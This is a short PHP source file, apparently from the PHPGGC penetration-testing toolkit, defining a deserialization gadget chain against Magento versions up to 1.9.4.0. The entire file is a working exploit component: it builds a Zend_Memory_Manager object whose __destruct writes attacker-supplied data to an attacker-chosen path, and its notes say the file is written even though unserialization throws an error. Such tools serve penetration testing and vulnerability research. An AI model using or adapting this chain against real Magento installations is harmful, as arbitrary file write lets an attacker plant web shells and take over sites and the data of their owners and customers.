<?php

namespace GadgetChain\Magento;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '? <= 1.9.4.0';
    public static $vector = '__destruct';
    public static $author = 'eboda';
    public static $information = 'The <remote_path> is either relative to the Magento root or absolute. The payload will throw an error during unserialization, but the file is written anyway.';

    public function generate(array $parameters)
    {
        $parameters = parent::process_parameters($parameters);

        $file = $parameters['remote_path'];
        $payload = $parameters['data'];

        return new \Zend_Memory_Manager($file, $payload);
    }
}
